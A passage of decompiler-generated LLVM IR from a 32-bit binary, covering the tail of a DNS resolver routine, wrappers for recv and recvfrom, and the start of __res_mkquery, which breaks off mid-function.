  store i1 %v2_804c1b6, i1* %zf.global-to-local, align 1
  store i32 %v1_804c1b6, i32* %ecx.global-to-local, align 4
  %v3_804c1b9 = add i32 %v2_804c1b9, %v2_804c1b3
  %v4_804c1b9 = inttoptr i32 %v3_804c1b9 to i8*
  %v5_804c1b9 = load i8, i8* %v4_804c1b9, align 1
  %v6_804c1b9 = zext i8 %v5_804c1b9 to i32
  %v8_804c1b9 = and i32 %v7_804c1b9, -256
  %v9_804c1b9 = or i32 %v6_804c1b9, %v8_804c1b9
  store i32 %v9_804c1b9, i32* %eax.global-to-local, align 4
  store i32 128, i32* %edx.global-to-local, align 4
  %v5_804c1c5 = add i32 %v4_804c1c5, %v2_804c1b3
  %v6_804c1c5 = inttoptr i32 %v5_804c1c5 to i8*
  %v7_804c1c5 = load i8, i8* %v6_804c1c5, align 1
  %v8_804c1c5 = xor i8 %v7_804c1c5, %v5_804c1b9
  %v9_804c1c5 = icmp eq i8 %v8_804c1c5, 0
  store i1 %v9_804c1c5, i1* %zf.global-to-local, align 1
  %v14_804c1c5 = zext i8 %v8_804c1c5 to i32
  %v17_804c1c5 = or i32 %v14_804c1c5, %v8_804c1b9
  store i32 %v17_804c1c5, i32* %eax.global-to-local, align 4
  br i1 %v2_804c1b6, label %bb194, label %bb

bb:                                               ; preds = %dec_label_pc_804c1af
  %v5_804c1cc = lshr i32 128, %v1_804c1b6
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v5_804c1cc, i32* %edx.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %dec_label_pc_804c1af, %bb
  %v0_804c1d1 = phi i32 [ 128, %dec_label_pc_804c1af ], [ %v5_804c1cc, %bb ]
  store i32 %v14_804c1c5, i32* %eax.global-to-local, align 4
  %v2_804c1d1 = and i32 %v0_804c1d1, %v14_804c1c5
  %v3_804c1d1 = icmp eq i32 %v2_804c1d1, 0
  store i1 %v3_804c1d1, i1* %zf.global-to-local, align 1
  br i1 %v3_804c1d1, label %dec_label_pc_804c1a6, label %dec_label_pc_804c1d7

dec_label_pc_804c1d7:                             ; preds = %bb194, %dec_label_pc_804c1a6, %dec_label_pc_804c163
  %v0_804c1d7 = phi i32 [ %v15_804ba43, %dec_label_pc_804c163 ], [ %v0_804c1b9.pre, %dec_label_pc_804c1a6 ], [ %v0_804c1b9.pre, %bb194 ]
  %storemerge16 = phi i32 [ 0, %dec_label_pc_804c163 ], [ %v1_804c1a6, %dec_label_pc_804c1a6 ], [ %v0_804c1a6, %bb194 ]
  store i32 %storemerge16, i32* @ebx, align 4
  %v9_804c1d7 = icmp eq i32 %v0_804c1d7, 12
  store i1 %v9_804c1d7, i1* %zf.global-to-local, align 1
  %v0_804c1da = load i32, i32* @ebp, align 4
  %v5_804c1da = inttoptr i32 %v0_804c1da to i8*
  store i8* %v5_804c1da, i8** %stack_var_-3564, align 4
  %v2_804c1db = call i32 @close(i32 %v0_804c1da)
  store i32 %v2_804c1db, i32* %eax.global-to-local, align 4
  %v0_804c1e0 = load i32, i32* @esp, align 4
  %v6_804c1e0 = icmp eq i32 %v0_804c1e0, -16
  store i1 %v6_804c1e0, i1* %zf.global-to-local, align 1
  %v0_804c1f5.pre = load i32, i32* @ebx, align 4
  %v1_804c20f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c1e3

dec_label_pc_804c1e3:                             ; preds = %dec_label_pc_804c110, %dec_label_pc_804c1d7
  %v1_804c20f = phi i32 [ 0, %dec_label_pc_804c110 ], [ %v1_804c20f.pre, %dec_label_pc_804c1d7 ]
  %v0_804c1f5 = phi i32 [ 0, %dec_label_pc_804c110 ], [ %v0_804c1f5.pre, %dec_label_pc_804c1d7 ]
  %v5_804c1ed = sub i32 15, %v0_804c0e1
  store i32 %v4_804c05c, i32* %ecx.global-to-local, align 4
  %v2_804c1f5 = mul i32 %v0_804c1f5, 256
  store i32 %v2_804c1f5, i32* @ebx, align 4
  %v2_804c1f8 = mul nuw nsw i32 %v4_804c0f1, 1048576
  %v2_804c1fb = mul i32 %v5_804c1ed, 65536
  %v5_804c205 = sub nsw i32 48, %stack_var_-3508.0213
  store i32 %v5_804c205, i32* %edx.global-to-local, align 4
  %v4_804c209 = add nuw i32 %stack_var_-3508.0213, 1
  %v2_804c1fe = or i32 %v2_804c1fb, %v5_804c205
  %v2_804c20d = or i32 %v2_804c1fe, %v2_804c1f8
  %v2_804c20f = or i32 %v2_804c20d, %v2_804c1f5
  %v2_804c211 = or i32 %v2_804c20f, %v1_804c20f
  %v2_804c213 = add i32 %v4_804c05c, 24
  %v3_804c213 = inttoptr i32 %v2_804c213 to i32*
  store i32 %v2_804c211, i32* %v3_804c213, align 4
  %v0_804c216 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c216 = add i32 %v0_804c216, 28
  store i32 %v1_804c216, i32* %ecx.global-to-local, align 4
  %v5_804c219 = inttoptr i32 %v1_804c216 to i8*
  store i32 %v0_804c232, i32* @eax, align 4
  %v15_804c221 = icmp eq i32 %v4_804c209, %v0_804c232
  store i1 %v15_804c221, i1* %zf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804c209, %v0_804c232
  br i1 %exitcond, label %dec_label_pc_804c21d.dec_label_pc_804c22b_crit_edge, label %dec_label_pc_804c05c

dec_label_pc_804c21d.dec_label_pc_804c22b_crit_edge: ; preds = %dec_label_pc_804c1e3
  %tmp195.phi.trans.insert = bitcast i8** %stack_var_4 to i32*
  %v3_804c23313.pre = load i32, i32* %tmp195.phi.trans.insert, align 4
  br label %dec_label_pc_804c22b

dec_label_pc_804c22b:                             ; preds = %dec_label_pc_804c025, %dec_label_pc_804c21d.dec_label_pc_804c22b_crit_edge
  %v3_804c23313 = phi i32 [ %v3_804c23313.pre, %dec_label_pc_804c21d.dec_label_pc_804c22b_crit_edge ], [ %v4_804c007, %dec_label_pc_804c025 ]
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  %tmp196 = bitcast i8** %stack_var_-3564 to i32*
  store i32 %v3_804c23313, i32* %tmp196, align 4
  %v7_804c23a = sext i32 %v0_804c232 to i64
  %v8_804c23a = call i32 @qsort(i32 %v3_804c23313, i64 %v7_804c23a, i32 28, i32 134527073)
  %v2_804c23f = load i8*, i8** %stack_var_-3564, align 4
  %v3_804c23f = ptrtoint i8* %v2_804c23f to i32
  store i32 %v3_804c23f, i32* %eax.global-to-local, align 4
  store i32 %v0_804c232, i32* %edx.global-to-local, align 4
  %v3_804c243 = load i32, i32* %stack_var_-20, align 4
  %v8_804c243 = inttoptr i32 %v3_804c243 to i8*
  store i8* %v8_804c243, i8** %stack_var_-3564, align 4
  %v4_804c24a = call i32 @__pthread_setcancelstate(i32 %v3_804c243, i32* null)
  store i32 %v4_804c24a, i32* %eax.global-to-local, align 4
  %v0_804c24f = load i32, i32* @esp, align 4
  %v6_804c24f = icmp eq i32 %v0_804c24f, -16
  store i1 %v6_804c24f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c261

dec_label_pc_804c261.loopexit:                    ; preds = %dec_label_pc_804c012
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804c261

dec_label_pc_804c261:                             ; preds = %dec_label_pc_804c261.loopexit, %dec_label_pc_804befd, %dec_label_pc_804bef3, %dec_label_pc_804bff3, %dec_label_pc_804bffe, %dec_label_pc_804bf37, %dec_label_pc_804be71, %dec_label_pc_804ba65, %dec_label_pc_804c22b, %dec_label_pc_804bf3d, %dec_label_pc_804bf0d
  %stack_var_-3512.5.off0 = phi i32 [ %v0_804c232, %dec_label_pc_804bffe ], [ %v0_804c232, %dec_label_pc_804c22b ], [ %v0_804c232, %dec_label_pc_804bff3 ], [ %stack_var_-3512.1.off040, %dec_label_pc_804bf37 ], [ -2, %dec_label_pc_804bf3d ], [ -11, %dec_label_pc_804be71 ], [ %v3_804bf16, %dec_label_pc_804bf0d ], [ -2, %dec_label_pc_804ba65 ], [ -3, %dec_label_pc_804bef3 ], [ -3, %dec_label_pc_804befd ], [ %v0_804c232, %dec_label_pc_804c261.loopexit ]
  store i32 %stack_var_-3512.5.off0, i32* %eax.global-to-local, align 4
  %v0_804c265 = load i32, i32* @esp, align 4
  %v9_804c265 = icmp eq i32 %v0_804c265, -3532
  store i1 %v9_804c265, i1* %zf.global-to-local, align 1
  store i32 %v0_804ba42, i32* @ebx, align 4
  store i32 %v0_804ba41, i32* @esi, align 4
  store i32 %v0_804ba40, i32* %edi.global-to-local, align 4
  store i32 %v0_804ba3f, i32* @ebp, align 4
  ret i32 %stack_var_-3512.5.off0

; uselistorder directives
  uselistorder i32 %stack_var_-3512.5.off0, { 1, 0 }
  uselistorder i32 %v3_804c23313, { 1, 0 }
  uselistorder i32 %v4_804c209, { 2, 0, 1 }
  uselistorder i32 %v2_804c1f5, { 1, 0 }
  uselistorder i32 %v5_804c1cc, { 1, 0 }
  uselistorder i32 %v14_804c1c5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c1b6, { 2, 1, 0 }
  uselistorder i32 %v2_804c1b3, { 1, 0 }
  uselistorder i32 %v0_804c1a6, { 2, 1, 0, 4, 3 }
  uselistorder i1 %v6_804c1a7, { 1, 0 }
  uselistorder i32 %v0_804c1b9.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v16_804c197, { 1, 0 }
  uselistorder i32 %v1_804c191, { 2, 1, 0 }
  uselistorder i1 %v15_804c175, { 1, 0 }
  uselistorder i32 %v0_804c0e1, { 1, 0, 2 }
  uselistorder i32 %v0_804c0d3, { 1, 2, 0 }
  uselistorder i1 %v11_804c08f, { 1, 0 }
  uselistorder i32 %v4_804c05c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %stack_var_-3508.0213, { 1, 0 }
  uselistorder i32 %v2_804c0a9, { 1, 0, 2 }
  uselistorder i32 %v2_804c04c, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v1_804c01f, { 1, 0 }
  uselistorder i32 %v1_804c012, { 0, 2, 3, 1 }
  uselistorder i1 %v9_804bffe, { 1, 0 }
  uselistorder i32 %v0_804c232, { 7, 8, 9, 10, 3, 5, 6, 0, 13, 2, 4, 12, 1, 11 }
  uselistorder i32 %v1_804bfea, { 1, 0 }
  uselistorder i32 %v1_804bfe9, { 2, 0, 3, 1 }
  uselistorder i1 %v11_804bfbb, { 1, 0 }
  uselistorder i32 %v0_804bfc3229, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-3512.3.off0, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %v1_804bfa3, { 1, 0 }
  uselistorder i32 %v1_804bfa2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_804bf8a, { 1, 0 }
  uselistorder i1 %v11_804bf85, { 1, 0 }
  uselistorder i32 %v0_804bf98241, { 2, 1, 0 }
  uselistorder i32 %v0_804bf66, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v4_804bf70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %stack_var_-3512.2.off0, { 4, 2, 3, 7, 0, 5, 1, 6 }
  uselistorder i32 %stack_var_-3512.1.off040, { 1, 2, 0, 3 }
  uselistorder i1 %v9_804bf0d, { 1, 0, 2 }
  uselistorder i32 %v3_804bef3, { 1, 0 }
  uselistorder i32 %v1_804bee0, { 1, 0 }
  uselistorder i32 %v0_804bee0.pre, { 2, 0, 1 }
  uselistorder i32 %v0_804bed0250, { 1, 0 }
  uselistorder i32 %v0_804bed1, { 2, 1, 0 }
  uselistorder i32 %v0_804be4a, { 1, 0 }
  uselistorder i1 %v9_804be35, { 1, 0 }
  uselistorder i1 %v9_804bde1, { 1, 0 }
  uselistorder i32 %v2_804bdd0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-3512.0.ph.in, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %v1_804bd33, { 1, 2, 0 }
  uselistorder i32 %v2_804bd2b, { 1, 0 }
  uselistorder i8 %v2_804bd25273, { 2, 1, 0 }
  uselistorder i32 %v1_804bd1a, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804bd12, { 2, 1, 0 }
  uselistorder i32 %v1_804bd07, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32 %v1_804bcda, { 1, 2, 0 }
  uselistorder i32 %v2_804bcd2, { 1, 0 }
  uselistorder i8 %v2_804bccc260, { 2, 1, 0 }
  uselistorder i32 %v1_804bccb, { 0, 2, 1, 3 }
  uselistorder i32 %v8_804bc8a, { 0, 4, 3, 5, 6, 1, 2 }
  uselistorder i32 %storemerge20, { 1, 0, 2 }
  uselistorder i32 %v4_804bc67, { 0, 3, 1, 2 }
  uselistorder i8* %tmp185, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v2_804bd6a, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 %v6_804bc42, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804bbff, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804bbcd, { 1, 0 }
  uselistorder i32 %v1_804bbcd, { 1, 0 }
  uselistorder i32 %v2_804bba5, { 1, 0 }
  uselistorder i1 %v9_804bb97, { 1, 0 }
  uselistorder i32 %v3_804bb3b, { 1, 0 }
  uselistorder i32 %v1_804bb3b, { 1, 0 }
  uselistorder i32 %v2_804bb1b, { 1, 0 }
  uselistorder i1 %v9_804bb0d, { 1, 0 }
  uselistorder i1 %v9_804bb4c, { 2, 1, 0 }
  uselistorder i8 %stack_var_20.0, { 2, 3, 1, 0 }
  uselistorder i32 %v5_804bab6, { 1, 0 }
  uselistorder i1 %v9_804baac, { 1, 0 }
  uselistorder i32 %v0_804baac, { 1, 0 }
  uselistorder i32 %v3_804ba6d, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-3556, { 21, 20, 19, 18, 0, 17, 16, 15, 14, 13, 12, 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8** %stack_var_-3564, { 28, 27, 2, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 5, 8, 7, 0, 3, 4, 6 }
  uselistorder i8** %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i8** %stack_var_8, { 2, 0, 1, 3 }
  uselistorder i8** %stack_var_4, { 0, 9, 1, 8, 7, 6, 3, 5, 4, 2, 10 }
  uselistorder i1* %zf.global-to-local, { 8, 6, 9, 31, 10, 11, 13, 14, 15, 16, 12, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 5, 32, 33, 34, 38, 35, 36, 37, 0, 7, 42, 39, 40, 41, 2, 43, 44, 45, 46, 47, 48, 49, 51, 50, 4, 52, 53, 54, 55, 56, 57, 58, 59, 83, 84, 60, 61, 62, 64, 65, 66, 63, 67, 68, 105, 69, 70, 71, 72, 74, 75, 3, 76, 73, 77, 78, 79, 80, 81, 82, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 93, 96, 97, 98, 99, 100, 101, 102, 103, 104 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 15, 14, 16, 17 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 64, 65, 44, 45, 46, 47, 48, 49, 50, 51, 105, 52, 53, 54, 55, 106, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 68, 69, 85, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104 }
  uselistorder i32 (i32, i32, i32)* @connect, { 0, 2, 1 }
  uselistorder i32 ()* @scopeof, { 1, 0 }
  uselistorder i32 ()* @policyof, { 1, 0 }
  uselistorder i8* inttoptr (i32 12 to i8*), { 1, 0 }
  uselistorder i32 280, { 1, 0, 2, 3 }
  uselistorder i32 512, { 3, 0, 1, 2 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 ()* @name_from_numeric, { 1, 0 }
  uselistorder i8* inttoptr (i32 28 to i8*), { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804c261, { 0, 8, 4, 3, 9, 5, 10, 1, 2, 6, 7 }
  uselistorder label %dec_label_pc_804c22b, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e3, { 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %dec_label_pc_804c1a2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0c3, { 1, 0 }
  uselistorder label %dec_label_pc_804c05c, { 1, 0 }
  uselistorder label %dec_label_pc_804c012, { 1, 0 }
  uselistorder label %dec_label_pc_804bff3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bfe9, { 1, 0 }
  uselistorder label %dec_label_pc_804bfbb, { 1, 0 }
  uselistorder label %dec_label_pc_804bfb0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfa2, { 1, 0 }
  uselistorder label %dec_label_pc_804bf85, { 1, 0 }
  uselistorder label %dec_label_pc_804bf6d, { 1, 0 }
  uselistorder label %dec_label_pc_804bf4a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bebc, { 1, 0 }
  uselistorder label %dec_label_pc_804be71, { 1, 0 }
  uselistorder label %dec_label_pc_804be3c, { 1, 0 }
  uselistorder label %dec_label_pc_804bda3, { 1, 0 }
  uselistorder label %dec_label_pc_804bd60, { 1, 0 }
  uselistorder label %dec_label_pc_804bd3b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804bd2b, { 1, 0 }
  uselistorder label %dec_label_pc_804bce2, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804bc86, { 1, 0 }
  uselistorder label %dec_label_pc_804bc7a, { 1, 0 }
  uselistorder label %dec_label_pc_804bbd7, { 1, 0 }
  uselistorder label %dec_label_pc_804bba2, { 1, 0 }
  uselistorder label %dec_label_pc_804bb18, { 1, 0 }
  uselistorder label %dec_label_pc_804babe, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804baa2, { 1, 0 }
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_804c287 = call i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 0, i32 0)
  ret i32 %v6_804c287
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804c2c3 = ptrtoint i32* %stack_var_-24 to i32
  %v7_804c2d5 = call i32 @__syscall_cp(i32 102, i32 12, i32 %v2_804c2c3, i32 0, i32 0, i32 0, i32 0)
  %v1_804c2de = call i32 @__syscall_ret(i32 %v7_804c2d5)
  ret i32 %v1_804c2de

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__res_mkquery(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp20 = call i16 @__decompiler_undefined_function_3()
  %tmp24 = trunc i32 %arg4 to i8
  %tmp26 = trunc i32 %arg3 to i8
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-291 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c2e8 = load i32, i32* @ebp, align 4
  %v0_804c2e9 = load i32, i32* @edi, align 4
  %v0_804c2ea = load i32, i32* @esi, align 4
  %v0_804c2eb = load i32, i32* @ebx, align 4
  store i32 %v0_804c2eb, i32* %stack_var_-16, align 4
  %v2_804c2fe = call i32 @strnlen(i32 %arg2, i32 255)
  %v12_804c303 = ptrtoint i32* %stack_var_-316 to i32
  %v1_804c306 = icmp eq i32 %v2_804c2fe, 0
  store i32 %v2_804c2fe, i32* %esi.global-to-local, align 4
  br i1 %v1_804c306, label %dec_label_pc_804c320, label %dec_label_pc_804c30c

dec_label_pc_804c30c:                             ; preds = %entry
  %v2_804c313 = add i32 %arg2, -1
  %v3_804c313 = add i32 %v2_804c313, %v2_804c2fe
  %v4_804c313 = inttoptr i32 %v3_804c313 to i8*
  %v5_804c313 = load i8, i8* %v4_804c313, align 1
  %v14_804c313 = icmp eq i8 %v5_804c313, 46
  %v1_804c318 = zext i1 %v14_804c313 to i32
  %v2_804c31e = sub i32 %v2_804c2fe, %v1_804c318
  store i32 %v2_804c31e, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c320

dec_label_pc_804c320:                             ; preds = %entry, %dec_label_pc_804c30c
  %v0_804c32d = phi i32 [ 0, %entry ], [ %v2_804c31e, %dec_label_pc_804c30c ]
  %v1_804c322 = icmp eq i32 %v0_804c32d, 0
  %v1_804c324 = icmp eq i1 %v1_804c322, false
  %v2_804c324 = zext i1 %v1_804c324 to i32
  %v2_804c32d = add i32 %v0_804c32d, 17
  %v3_804c32d = add i32 %v2_804c32d, %v2_804c324
  store i32 %v3_804c32d, i32* @edi, align 4
  %v6_804c337 = icmp ugt i32 %v0_804c32d, 253
  br i1 %v6_804c337, label %dec_label_pc_804c45b, label %dec_label_pc_804c33d

dec_label_pc_804c33d:                             ; preds = %dec_label_pc_804c320
  %v5_804c344 = icmp sgt i32 %v3_804c32d, %arg6
  br i1 %v5_804c344, label %dec_label_pc_804c45b, label %dec_label_pc_804c34a

dec_label_pc_804c34a:                             ; preds = %dec_label_pc_804c33d
  %v7_804c352 = icmp ugt i8 %arg1, 15
  br i1 %v7_804c352, label %dec_label_pc_804c45b, label %dec_label_pc_804c358

dec_label_pc_804c358:                             ; preds = %dec_label_pc_804c34a
  %sext = mul i32 %arg3, 16777216
  %v4_804c358 = sdiv i32 %sext, 16777216
  %v7_804c363 = icmp ugt i32 %v4_804c358, 255
  br i1 %v7_804c363, label %dec_label_pc_804c45b, label %dec_label_pc_804c369

dec_label_pc_804c369:                             ; preds = %dec_label_pc_804c358
  %sext7 = mul i32 %arg4, 16777216
  %v4_804c369 = sdiv i32 %sext7, 16777216
  %v7_804c374 = icmp ugt i32 %v4_804c369, 255
  br i1 %v7_804c374, label %dec_label_pc_804c45b, label %dec_label_pc_804c37a

dec_label_pc_804c37a:                             ; preds = %dec_label_pc_804c369
  store i32 13, i32* @ebx, align 4
  %v2_804c383 = ptrtoint i32* %stack_var_-304 to i32
  %v3_804c388 = bitcast i32* %stack_var_-304 to i8*
  %v4_804c388 = call i32 @memset(i8* %v3_804c388, i32 0, i32 %v3_804c32d)
  %v0_804c3a7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v2_804c383, i32* @esi, align 4
  %v3_804c3b6 = bitcast i32* %stack_var_-291 to i8*
  %v4_804c3b6 = call i32 @memcpy(i8* %v3_804c3b6, i32 %arg2, i32 %v0_804c3a7)
  %v1_804c3e6.pre = load i32, i32* @ebx, align 4
  %v2_804c3e661 = add i32 %v1_804c3e6.pre, 12
  %v3_804c3e662 = add i32 %v2_804c3e661, %v12_804c303
  %v4_804c3e663 = inttoptr i32 %v3_804c3e662 to i8*
  %v5_804c3e664 = load i8, i8* %v4_804c3e663, align 1
  %v6_804c3e665 = icmp eq i8 %v5_804c3e664, 0
  br i1 %v6_804c3e665, label %dec_label_pc_804c3f5, label %dec_label_pc_804c3ef

dec_label_pc_804c3c0:                             ; preds = %dec_label_pc_804c3c8
  %v1_804c3c0 = add i32 %v0_804c3db56, 1
  store i32 %v1_804c3c0, i32* @edx, align 4
  %v1_804c3c1 = inttoptr i32 %v1_804c3c359 to i8*
  %v2_804c3c1 = load i8, i8* %v1_804c3c1, align 1
  %v3_804c3c1 = zext i8 %v2_804c3c1 to i32
  %v5_804c3c1 = and i32 %v6_804c3c158, -256
  %v6_804c3c1 = or i32 %v3_804c3c1, %v5_804c3c1
  store i32 %v6_804c3c1, i32* @ecx, align 4
  %v4_804c3c4 = icmp eq i8 %v2_804c3c1, 0
  br i1 %v4_804c3c4, label %dec_label_pc_804c3cd, label %dec_label_pc_804c3c8

dec_label_pc_804c3c8:                             ; preds = %dec_label_pc_804c3ef, %dec_label_pc_804c3c0
  %v1_804c3c359.in = phi i32 [ %v1_804c3c359, %dec_label_pc_804c3c0 ], [ %v2_804c3ef, %dec_label_pc_804c3ef ]
  %v6_804c3c158 = phi i32 [ %v6_804c3c1, %dec_label_pc_804c3c0 ], [ %v6_804c3c152, %dec_label_pc_804c3ef ]
  %v2_804c3c157 = phi i8 [ %v2_804c3c1, %dec_label_pc_804c3c0 ], [ %v2_804c3c149, %dec_label_pc_804c3ef ]
  %v0_804c3db56 = phi i32 [ %v1_804c3c0, %dec_label_pc_804c3c0 ], [ %v3_804c3fc67, %dec_label_pc_804c3ef ]
  %v1_804c3c359 = add i32 %v1_804c3c359.in, 1
  %v10_804c3c8 = icmp eq i8 %v2_804c3c157, 46
  %v1_804c3cb = icmp eq i1 %v10_804c3c8, false
  br i1 %v1_804c3cb, label %dec_label_pc_804c3c0, label %dec_label_pc_804c3cd

dec_label_pc_804c3cd:                             ; preds = %dec_label_pc_804c3c0, %dec_label_pc_804c3c8, %dec_label_pc_804c3ef
  %v0_804c3db.lcssa = phi i32 [ %v3_804c3fc67, %dec_label_pc_804c3ef ], [ %v0_804c3db56, %dec_label_pc_804c3c8 ], [ %v1_804c3c0, %dec_label_pc_804c3c0 ]
  %v2_804c3cf = sub i32 %v0_804c3db.lcssa, %v3_804c3fc67
  %v1_804c3d1 = add i32 %v2_804c3cf, -1
  %v6_804c3d5 = icmp ugt i32 %v1_804c3d1, 62
  br i1 %v6_804c3d5, label %dec_label_pc_804c45b, label %dec_label_pc_804c3db

dec_label_pc_804c3db:                             ; preds = %dec_label_pc_804c3cd
  %v1_804c3dd = trunc i32 %v0_804c3db.lcssa to i8
  %v3_804c3dd = trunc i32 %v3_804c3fc67 to i8
  %v4_804c3dd = sub i8 %v1_804c3dd, %v3_804c3dd
  %v4_804c3df = add i32 %v3_804c3fc67, 11
  %v5_804c3df = add i32 %v4_804c3df, %v2_804c3fc68
  %v6_804c3df = inttoptr i32 %v5_804c3df to i8*
  store i8 %v4_804c3dd, i8* %v6_804c3df, align 1
  %v0_804c3e3 = load i32, i32* @edx, align 4
  %v1_804c3e3 = add i32 %v0_804c3e3, 1
  store i32 %v1_804c3e3, i32* @ebx, align 4
  %v0_804c3e6.pre = load i32, i32* @esp, align 4
  %v2_804c3e6 = add i32 %v0_804c3e3, 13
  %v3_804c3e6 = add i32 %v2_804c3e6, %v0_804c3e6.pre
  %v4_804c3e6 = inttoptr i32 %v3_804c3e6 to i8*
  %v5_804c3e6 = load i8, i8* %v4_804c3e6, align 1
  %v6_804c3e6 = icmp eq i8 %v5_804c3e6, 0
  br i1 %v6_804c3e6, label %dec_label_pc_804c3f5, label %dec_label_pc_804c3ef

dec_label_pc_804c3ef:                             ; preds = %dec_label_pc_804c37a, %dec_label_pc_804c3db
  %v2_804c3fc68 = phi i32 [ %v0_804c3e6.pre, %dec_label_pc_804c3db ], [ %v12_804c303, %dec_label_pc_804c37a ]
  %v3_804c3fc67 = phi i32 [ %v1_804c3e3, %dec_label_pc_804c3db ], [ %v1_804c3e6.pre, %dec_label_pc_804c37a ]
  %v2_804c3ef = add i32 %v3_804c3fc67, %v2_804c383
  %v4_804c3c1.pre = load i32, i32* @ecx, align 4
  store i32 %v3_804c3fc67, i32* @edx, align 4
  %v1_804c3c148 = inttoptr i32 %v2_804c3ef to i8*
  %v2_804c3c149 = load i8, i8* %v1_804c3c148, align 1
  %v3_804c3c150 = zext i8 %v2_804c3c149 to i32
  %v5_804c3c151 = and i32 %v4_804c3c1.pre, -256
  %v6_804c3c152 = or i32 %v3_804c3c150, %v5_804c3c151
  store i32 %v6_804c3c152, i32* @ecx, align 4
  %v4_804c3c454 = icmp eq i8 %v2_804c3c149, 0
  br i1 %v4_804c3c454, label %dec_label_pc_804c3cd, label %dec_label_pc_804c3c8

dec_label_pc_804c3f5:                             ; preds = %dec_label_pc_804c3db, %dec_label_pc_804c37a
  %v3_804c3fc.lcssa = phi i32 [ %v1_804c3e6.pre, %dec_label_pc_804c37a ], [ %v1_804c3e3, %dec_label_pc_804c3db ]
  %v2_804c3fc.lcssa = phi i32 [ %v12_804c303, %dec_label_pc_804c37a ], [ %v0_804c3e6.pre, %dec_label_pc_804c3db ]
  %v4_804c3fc = add i32 %v3_804c3fc.lcssa, 13
  %v5_804c3fc = add i32 %v4_804c3fc, %v2_804c3fc.lcssa
  %v6_804c3fc = inttoptr i32 %v5_804c3fc to i8*
  store i8 %tmp24, i8* %v6_804c3fc, align 1
  %v2_804c407 = load i32, i32* @esp, align 4
  %v3_804c407 = load i32, i32* @ebx, align 4
  %v4_804c407 = add i32 %v2_804c407, 15
  %v5_804c407 = add i32 %v4_804c407, %v3_804c407
  %v6_804c407 = inttoptr i32 %v5_804c407 to i8*
  store i8 %tmp26, i8* %v6_804c407, align 1
